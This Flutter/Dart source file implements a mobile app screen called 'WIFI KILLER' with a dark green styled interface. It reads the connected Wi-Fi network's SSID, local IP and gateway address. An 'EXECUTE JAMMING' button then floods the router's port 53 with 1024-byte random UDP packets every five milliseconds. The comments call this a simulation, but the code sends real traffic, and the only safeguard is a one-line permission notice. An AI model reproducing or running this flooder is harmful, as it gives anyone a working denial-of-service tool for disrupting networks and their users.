import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';

class WifiKillerPage extends StatefulWidget {
  const WifiKillerPage({super.key});

  @override
  State<WifiKillerPage> createState() => _WifiKillerPageState();
}

class _WifiKillerPageState extends State<WifiKillerPage> with TickerProviderStateMixin {
  String ssid = "-";
  String ip = "-";
  String routerIp = "-";
  bool isKilling = false;
  Timer? _loopTimer;

  // UBAH: Theme Colors ke Deep Green & Black
  final Color bgBlack = const Color(0xFF050505);
  final Color accentGreen = const Color(0xFF1B5E20);
  final Color lightGreen = const Color(0xFF2ECC71);
  final Color glassBorder = Colors.white.withOpacity(0.08);
  final Color glassBg = Colors.white.withOpacity(0.03);

  late AnimationController _scanController;
  late AnimationController _pulseController;

  @override
  void initState() {
    super.initState();
    _scanController = AnimationController(vsync: this, duration: const Duration(seconds: 3))..repeat();
    _pulseController = AnimationController(vsync: this, duration: const Duration(milliseconds: 800))..repeat(reverse: true);
    _loadWifiInfo();
  }

  @override
  void dispose() {
    _stopFlood();
    _scanController.dispose();
    _pulseController.dispose();
    super.dispose();
  }

  // --- LOGIC (WiFi & Flood) ---
  Future<void> _loadWifiInfo() async {
    final info = NetworkInfo();
    final status = await Permission.locationWhenInUse.request();
    if (!status.isGranted) return;

    try {
      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gateway = await info.getWifiGatewayIP();
      setState(() {
        ssid = name?.replaceAll('"', '') ?? "IDENTIFYING...";
        ip = ipAddr ?? "0.0.0.0";
        routerIp = gateway ?? "0.0.0.0";
      });
    } catch (_) {}
  }

  void _startFlood() {
    if (routerIp == "0.0.0.0" || routerIp == "-") return;
    setState(() => isKilling = true);
    HapticFeedback.heavyImpact();

    // Payload simulasi muatan data
    final List<int> payload = List<int>.generate(1024, (_) => Random().nextInt(256));
    _loopTimer = Timer.periodic(const Duration(milliseconds: 5), (_) async {
      try {
        final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
        socket.send(payload, InternetAddress(routerIp), 53); // DNS Port Flood simulation
        socket.close();
      } catch (_) {}
    });
  }

  void _stopFlood() {
    setState(() => isKilling = false);
    _loopTimer?.cancel();
    HapticFeedback.mediumImpact();
  }

  // --- UI COMPONENTS ---

  Widget _buildGlassContainer({required Widget child, EdgeInsetsGeometry? padding, Color? borderColor}) {
    return ClipRRect(
      borderRadius: BorderRadius.circular(24),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
        child: Container(
          padding: padding,
          decoration: BoxDecoration(
            color: glassBg,
            borderRadius: BorderRadius.circular(24),
            border: Border.all(color: borderColor ?? glassBorder),
          ),
          child: child,
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgBlack,
      body: Stack(
        children: [
          // Background Glows
          Positioned(top: -50, left: -50, child: _buildGlowOrb(300, accentGreen.withOpacity(0.15))),
          Positioned(bottom: 100, right: -100, child: _buildGlowOrb(250, lightGreen.withOpacity(0.05))),

          SafeArea(
            child: Padding(
              padding: const EdgeInsets.symmetric(horizontal: 20),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const SizedBox(height: 20),
                  // Header
                  _buildHeader(context),
                  const SizedBox(height: 30),

                  // Info Display
                  _buildGlassContainer(
                    padding: const EdgeInsets.all(24),
                    child: Column(
                      children: [
                        _infoTile("TARGET SSID", ssid, Icons.wifi_find_rounded),
                        const Padding(
                          padding: EdgeInsets.symmetric(vertical: 15),
                          child: Divider(color: Colors.white10, height: 1),
                        ),
                        _infoTile("GATEWAY ADDR", routerIp, Icons.settings_input_antenna),
                        const Padding(
                          padding: EdgeInsets.symmetric(vertical: 15),
                          child: Divider(color: Colors.white10, height: 1),
                        ),
                        _infoTile("LOCAL NODE", ip, Icons.lan_outlined),
                      ],
                    ),
                  ),

                  const SizedBox(height: 25),

                  // Radar / Status View
                  Expanded(
                    child: Center(
                      child: isKilling ? _buildActiveAttackUI() : _buildIdleUI(),
                    ),
                  ),

                  // Warning Notice
                  _buildNotice(),
                  const SizedBox(height: 20),

                  // Big Action Button
                  _buildActionButton(),
                  const SizedBox(height: 30),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildHeader(BuildContext context) {
    return Row(
      children: [
        GestureDetector(
          onTap: () => Navigator.pop(context),
          child: _buildGlassContainer(
            padding: const EdgeInsets.all(10),
            child: const Icon(Icons.arrow_back_ios_new, color: Colors.white, size: 18),
          ),
        ),
        const SizedBox(width: 15),
        const Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text("WIFI KILLER", style: TextStyle(color: Colors.white, fontSize: 22, fontWeight: FontWeight.bold, letterSpacing: 1.5)),
            Text("UDP FLOOD PROTOCOL v1.0", style: TextStyle(color: Color(0xFF2ECC71), fontSize: 9, fontWeight: FontWeight.bold, letterSpacing: 2)),
          ],
        ),
      ],
    );
  }

  Widget _buildNotice() {
    return _buildGlassContainer(
      padding: const EdgeInsets.all(15),
      borderColor: isKilling ? Colors.redAccent.withOpacity(0.3) : glassBorder,
      child: Row(
        children: [
          Icon(Icons.gpp_maybe_rounded, color: isKilling ? Colors.redAccent : lightGreen, size: 20),
          const SizedBox(width: 15),
          const Expanded(
            child: Text("Ensure you have explicit permission to test this network gateway.",
                style: TextStyle(color: Colors.white54, fontSize: 11, height: 1.4)),
          ),
        ],
      ),
    );
  }

  Widget _buildActionButton() {
    return GestureDetector(
      onTap: isKilling ? _stopFlood : _startFlood,
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 300),
        height: 70,
        decoration: BoxDecoration(
          gradient: isKilling
              ? const LinearGradient(colors: [Color(0xFFB71C1C), Color(0xFFFF5252)])
              : LinearGradient(colors: [accentGreen, lightGreen]),
          borderRadius: BorderRadius.circular(20),
          boxShadow: [
            BoxShadow(color: (isKilling ? Colors.red : lightGreen).withOpacity(0.2), blurRadius: 20, offset: const Offset(0, 8))
          ],
        ),
        child: Center(
          child: Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(isKilling ? Icons.power_settings_new_rounded : Icons.bolt_rounded, color: isKilling ? Colors.white : Colors.black, size: 28),
              const SizedBox(width: 12),
              Text(
                isKilling ? "ABORT MISSION" : "EXECUTE JAMMING",
                style: TextStyle(
                    color: isKilling ? Colors.white : Colors.black,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 2,
                    fontSize: 16
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildIdleUI() {
    return Column(
      mainAxisAlignment: MainAxisAlignment.center,
      children: [
        Stack(
          alignment: Alignment.center,
          children: [
            RotationTransition(
              turns: _scanController,
              child: Container(
                width: 180, height: 180,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  border: Border.all(color: lightGreen.withOpacity(0.1), width: 1),
                  gradient: SweepGradient(
                    colors: [Colors.transparent, lightGreen.withOpacity(0.3), Colors.transparent],
                    stops: const [0.0, 0.5, 1.0],
                  ),
                ),
              ),
            ),
            Container(
              width: 100, height: 100,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                border: Border.all(color: lightGreen.withOpacity(0.2)),
                color: lightGreen.withOpacity(0.02),
              ),
              child: Icon(Icons.wifi_lock_rounded, color: lightGreen.withOpacity(0.5), size: 40),
            ),
          ],
        ),
        const SizedBox(height: 30),
        const Text("NETWORK STANDBY", style: TextStyle(color: Colors.white24, fontSize: 10, fontWeight: FontWeight.bold, letterSpacing: 4)),
      ],
    );
  }

  Widget _buildActiveAttackUI() {
    return Column(
      mainAxisAlignment: MainAxisAlignment.center,
      children: [
        AnimatedBuilder(
          animation: _pulseController,
          builder: (context, child) {
            return Container(
              width: 200 * _pulseController.value,
              height: 200 * _pulseController.value,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                border: Border.all(
                  color: Colors.redAccent.withOpacity(1 - _pulseController.value),
                  width: 3,
                ),
              ),
            );
          },
        ),
        const Icon(Icons.refresh, color: Colors.redAccent, size: 60),
        const SizedBox(height: 25),
        const Text("JAMMING IN PROGRESS", style: TextStyle(color: Colors.redAccent, fontWeight: FontWeight.bold, fontSize: 14, letterSpacing: 2)),
        const SizedBox(height: 8),
        Text("PACKET SIZE: 1024 BYTES", style: TextStyle(color: Colors.redAccent.withOpacity(0.5), fontSize: 10, fontFamily: 'monospace')),
      ],
    );
  }

  Widget _infoTile(String label, String value, IconData icon) {
    return Row(
      children: [
        Container(
          padding: const EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: lightGreen.withOpacity(0.05),
            borderRadius: BorderRadius.circular(15),
            border: Border.all(color: lightGreen.withOpacity(0.1)),
          ),
          child: Icon(icon, color: lightGreen, size: 22),
        ),
        const SizedBox(width: 20),
        Expanded(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(label, style: const TextStyle(color: Colors.white38, fontSize: 9, fontWeight: FontWeight.bold, letterSpacing: 1)),
              const SizedBox(height: 4),
              Text(value, style: const TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold, fontFamily: 'monospace')),
            ],
          ),
        ),
      ],
    );
  }

  Widget _buildGlowOrb(double size, Color color) {
    return Container(
      width: size, height: size,
      decoration: BoxDecoration(shape: BoxShape.circle, color: color, boxShadow: [BoxShadow(color: color, blurRadius: 100, spreadRadius: 40)]),
    );
  }
}